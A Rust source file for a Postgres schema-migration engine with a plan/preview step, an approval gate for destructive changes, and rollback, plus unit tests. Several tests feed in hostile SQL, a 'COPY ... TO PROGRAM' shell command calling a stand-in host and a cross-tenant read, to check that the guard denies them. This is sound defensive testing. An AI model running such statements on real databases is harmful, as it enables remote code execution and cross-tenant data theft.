//! The public `MigrationEngine` API — `plan` (lint/preview) → `gate` (approval)
//! → [`executor::apply`](crate::executor::apply) (guard + role) (design §3 / §1.6).
//!
//! This is the surface a caller (control plane / CLI / builder) drives. The
//! pieces beneath it — the [`SqlGuard`](crate::guard::SqlGuard), the Postgres
//! [`apply`](crate::executor::apply) flow, the least-privilege
//! [`migrator` role](crate::role) — are already built; the engine *composes*
//! them into the documented pipeline:
//!
//! 1. an **author** (see [`crate::author`]) produces the [`Migration`]s;
//! 2. [`MigrationEngine::plan`] runs the guard over every migration **read-only**
//!    (no DB) and returns a [`MigrationPlan`] — the dry-run / preview (scenario
//!    45): which migrations are destructive, which require approval, and which
//!    are *denied* (un-appliable);
//! 3. [`MigrationEngine::apply`] is the **gate**: it refuses a plan with any
//!    denial, refuses a destructive plan without explicit [`Approval::Approved`],
//!    and otherwise delegates to [`executor::apply`](crate::executor::apply).
//!
//! **Defense in depth — the gate is additional, not a replacement.**
//! [`executor::apply`](crate::executor::apply) *re-runs* the guard over every
//! pending `up` and runs the DDL under the least-privilege `migrator` role
//! (lines 1 & 2 of §1). The engine gate is a third check layered in front: even
//! if a caller hand-built a plan, the executor still independently denies the
//! dangerous surface and confines execution. The engine never disables those.

use compio_postgres::Client;

use crate::db::ExecutorConfig;
use crate::executor::{
    self, ApplyError, ApplyOutcome, RollbackError, RollbackOutcome, RollbackRequest,
};
use crate::guard::{GuardConfig, GuardError, GuardReport, SqlGuard};
use crate::migration::Migration;

/// One linted migration in a [`MigrationPlan`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlannedMigration {
    /// The migration itself (clone of the input).
    pub migration: Migration,
    /// Its passing guard report (classes + destructive flag + lint warnings).
    pub report: GuardReport,
}

/// The read-only result of [`MigrationEngine::plan`] — the dry-run / preview
/// (design scenario 45).
///
/// A plan is **un-appliable** if [`denied`](Self::denied) is non-empty: the
/// guard hard-denied at least one migration's `up` (RCE / cross-tenant / file /
/// network), so [`MigrationEngine::apply`] refuses it outright.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MigrationPlan {
    /// The migrations that passed the guard, with their reports, in input order.
    pub items: Vec<PlannedMigration>,
    /// `true` if any planned item is destructive (data loss).
    pub destructive: bool,
    /// `true` if applying this plan requires explicit approval (any destructive
    /// item). Mirrors `destructive` today; kept distinct so a future authoring
    /// facet (a non-destructive-but-gated op) can require approval independently.
    pub requires_approval: bool,
    /// Migrations the guard **denied**, as `(version, error)`. A non-empty list
    /// makes the whole plan un-appliable — `apply` returns
    /// [`EngineError::Denied`] and runs nothing.
    pub denied: Vec<(String, GuardError)>,
}

impl MigrationPlan {
    /// `true` if the plan can be applied (no denials).
    #[must_use]
    pub const fn is_appliable(&self) -> bool {
        self.denied.is_empty()
    }
}

/// The caller's approval decision for [`MigrationEngine::apply`].
///
/// A destructive plan (`requires_approval`) needs [`Approval::Approved`] to
/// apply; a safe additive plan applies with [`Approval::None`]. The AI never
/// auto-applies destructive ops (design §1.6) — it passes [`Approval::None`] and
/// surfaces [`EngineError::ApprovalRequired`] to a human.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Approval {
    /// No approval given — applies only a non-destructive plan.
    None,
    /// Explicitly approved — a destructive plan may apply.
    Approved,
}

/// A failure from [`MigrationEngine::apply`].
#[derive(Debug, thiserror::Error)]
pub enum EngineError {
    /// The plan contains guard denials and can never be applied. Carries the
    /// denied `(version, error)` pairs for reporting. Nothing was applied.
    #[error("plan is un-appliable: {} migration(s) denied by the guard", .0.len())]
    Denied(Vec<(String, GuardError)>),
    /// The plan is destructive (or otherwise requires approval) but
    /// [`Approval::Approved`] was not given. Nothing was applied.
    #[error("plan requires approval (destructive) but none was given")]
    ApprovalRequired,
    /// The executor failed (DB error, checksum drift, mid-apply failure, or the
    /// executor's own re-run of the guard denied a migration — defense in depth).
    #[error(transparent)]
    Apply(#[from] ApplyError),
}

/// A failure from [`MigrationEngine::rollback`].
#[derive(Debug, thiserror::Error)]
pub enum RollbackEngineError {
    /// Rollback is destructive (a `down` typically drops/reverses schema) and
    /// requires explicit [`Approval::Approved`], which was not given. Nothing was
    /// rolled back.
    #[error("rollback requires approval (a down is destructive) but none was given")]
    ApprovalRequired,
    /// The executor's rollback failed (guard denial on a `down`, irreversible
    /// without force, checksum drift, mid-rollback DB error, …).
    #[error(transparent)]
    Rollback(#[from] RollbackError),
}

/// The public migration engine (design §3 `MigrationEngine` seam).
#[derive(Debug, Clone, Default)]
pub struct MigrationEngine;

impl MigrationEngine {
    /// Construct the engine. (Stateless; the executor + guard config are passed
    /// per call so one engine serves every project.)
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Lint + preview a migration set **read-only** (no DB) — the dry-run /
    /// plan phase (design scenario 45).
    ///
    /// Runs the [`SqlGuard`] over every migration's `up`. A guard **denial** is
    /// recorded in [`MigrationPlan::denied`] (and the migration is *not* added to
    /// `items`), so a caller sees **every** problem in the set at once rather
    /// than aborting on the first. `destructive` / `requires_approval` are `true`
    /// if any passing item's report flags data loss.
    #[must_use]
    pub fn plan(&self, migrations: &[Migration], cfg: &GuardConfig) -> MigrationPlan {
        let guard = SqlGuard::new(cfg.clone());
        let mut items = Vec::new();
        let mut denied = Vec::new();
        let mut destructive = false;
        for m in migrations {
            match guard.check(&m.up) {
                Ok(report) => {
                    destructive |= report.destructive;
                    items.push(PlannedMigration {
                        migration: m.clone(),
                        report,
                    });
                }
                Err(e) => denied.push((m.version.as_str().to_string(), e)),
            }
        }
        MigrationPlan {
            items,
            destructive,
            requires_approval: destructive,
            denied,
        }
    }

    /// Apply a plan through the gate (design §1.6).
    ///
    /// The gate, in order:
    /// 1. if [`MigrationPlan::denied`] is non-empty ⇒ [`EngineError::Denied`]
    ///    (never apply — a denied batch applies *nothing*);
    /// 2. if [`MigrationPlan::requires_approval`] and `approval != Approved` ⇒
    ///    [`EngineError::ApprovalRequired`] (nothing applied);
    /// 3. otherwise delegate to [`executor::apply`](crate::executor::apply),
    ///    which **independently re-runs the guard** over every pending `up` and
    ///    runs the DDL under the least-privilege `migrator` role — defense in
    ///    depth, not bypassed by this gate.
    ///
    /// `applied_by` is the actor recorded in the journal (`app/actor/AI`).
    ///
    /// # Errors
    /// - [`EngineError::Denied`] — the plan had guard denials.
    /// - [`EngineError::ApprovalRequired`] — destructive plan without approval.
    /// - [`EngineError::Apply`] — the executor failed (incl. its own guard
    ///   re-check, checksum drift, or a mid-apply DB error).
    pub async fn apply(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, EngineError> {
        // Gate 1: a denied plan can never be applied.
        if !plan.denied.is_empty() {
            return Err(EngineError::Denied(plan.denied.clone()));
        }
        // Gate 2: destructive plans need explicit approval.
        if plan.requires_approval && approval != Approval::Approved {
            return Err(EngineError::ApprovalRequired);
        }
        // Gate 3: delegate to the executor, which re-runs the guard + role
        // (defense in depth). Reconstruct the migration set from the plan's
        // passing items (denied is empty here, so items == the full input set).
        let migrations: Vec<Migration> =
            plan.items.iter().map(|p| p.migration.clone()).collect();
        let outcome = executor::apply(conn, exec_cfg, &migrations, applied_by).await?;
        Ok(outcome)
    }

    /// Roll back applied migrations to a [`RollbackTarget`] through the gate
    /// (design §5).
    ///
    /// A `down` is privileged SQL that typically **reverses** schema (drops the
    /// objects an `up` created), so rollback is treated as destructive: it
    /// **requires [`Approval::Approved`]** — the AI never auto-rolls-back. Given
    /// approval, it delegates to [`executor::rollback`](crate::executor::rollback),
    /// which **independently** runs every `down` through the guard and under the
    /// least-privilege `migrator` role (defense in depth, identical to the up
    /// path), refuses to cross an irreversible (`down: None`) migration unless
    /// `request.options.force` + `request.options.backup_acknowledged`, and
    /// journals each rollback as an append-only `rolled_back` event.
    ///
    /// `applied_by` is the actor recorded in the journal.
    ///
    /// # Errors
    /// - [`RollbackEngineError::ApprovalRequired`] — `approval != Approved`.
    /// - [`RollbackEngineError::Rollback`] — the executor's rollback failed
    ///   (guard denial on a `down`, irreversible without force, checksum drift,
    ///   missing-from-set, unknown target, or a mid-rollback DB error).
    pub async fn rollback(
        &self,
        migrations: &[Migration],
        request: RollbackRequest,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<RollbackOutcome, RollbackEngineError> {
        // Gate: rollback is destructive ⇒ explicit approval required.
        if approval != Approval::Approved {
            return Err(RollbackEngineError::ApprovalRequired);
        }
        let outcome =
            executor::rollback(conn, exec_cfg, migrations, request, applied_by).await?;
        Ok(outcome)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::author::{AuthorRequest, Column, DeterministicAuthor, MigrationAuthor, RawSqlAuthor};

    fn guard_cfg() -> GuardConfig {
        GuardConfig {
            project_schema: "proj_acme".into(),
            extension_allowlist: Vec::new(),
        }
    }

    fn det() -> DeterministicAuthor {
        DeterministicAuthor::new("proj_acme", "app_acme")
    }

    #[test]
    fn plan_of_safe_additive_set_needs_no_approval_and_has_no_denials() {
        let create = det()
            .author(&AuthorRequest::CreateTable {
                name: "orders".into(),
                columns: vec![Column {
                    name: "id".into(),
                    ty: "bigint".into(),
                    nullable: false,
                }],
            })
            .unwrap();
        let add = det()
            .author(&AuthorRequest::AddColumn {
                table: "orders".into(),
                column: Column {
                    name: "note".into(),
                    ty: "text".into(),
                    nullable: true,
                },
            })
            .unwrap();
        let set: Vec<Migration> = create.into_iter().chain(add).collect();

        let plan = MigrationEngine::new().plan(&set, &guard_cfg());
        assert_eq!(plan.items.len(), 2);
        assert!(plan.denied.is_empty());
        assert!(!plan.destructive);
        assert!(!plan.requires_approval);
        assert!(plan.is_appliable());
    }

    #[test]
    fn plan_with_a_drop_is_destructive_and_requires_approval() {
        let drop = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap("drop_legacy", "DROP TABLE \"proj_acme\".\"legacy\"", None)
            .unwrap();
        let plan = MigrationEngine::new().plan(&[drop], &guard_cfg());
        assert!(plan.denied.is_empty(), "DROP is flagged, not denied");
        assert!(plan.destructive);
        assert!(plan.requires_approval);
        // The item's own report agrees.
        assert!(plan.items[0].report.destructive);
    }

    #[test]
    fn plan_with_a_dangerous_up_records_a_denial() {
        // COPY … TO PROGRAM is shell RCE — hard-denied (not merely flagged).
        let evil = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap(
                "rce",
                "COPY \"proj_acme\".\"t\" TO PROGRAM 'curl evil.test'",
                None,
            )
            .unwrap();
        let plan = MigrationEngine::new().plan(std::slice::from_ref(&evil), &guard_cfg());
        assert_eq!(plan.items.len(), 0, "denied migration is not a planned item");
        assert_eq!(plan.denied.len(), 1);
        assert_eq!(plan.denied[0].0, evil.version.as_str());
        assert!(!plan.is_appliable());
    }

    #[test]
    fn plan_collects_every_denial_not_just_the_first() {
        let raw = RawSqlAuthor::new("proj_acme", "app_acme");
        let a = raw
            .wrap("rce", "COPY \"proj_acme\".\"t\" TO PROGRAM 'sh'", None)
            .unwrap();
        let b = raw.wrap("xtenant", "SELECT * FROM control.users", None).unwrap();
        let plan = MigrationEngine::new().plan(&[a, b], &guard_cfg());
        assert_eq!(plan.denied.len(), 2, "both denials surface");
    }
}
